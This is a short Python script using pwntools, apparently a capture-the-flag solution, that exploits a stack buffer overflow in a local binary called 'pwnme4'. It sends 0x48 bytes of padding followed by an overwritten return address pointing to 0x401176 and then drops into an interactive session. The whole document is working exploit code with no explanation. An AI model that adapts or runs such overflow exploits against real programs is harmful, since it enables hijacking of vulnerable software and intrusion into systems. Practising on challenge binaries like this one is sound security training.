from pwn import *

context.arch = "amd64"
b = process('./pwnme4')

payload = b'A' * 0x48 + p64(0x0000000000401176)

b.sendline(payload)
b.interactive()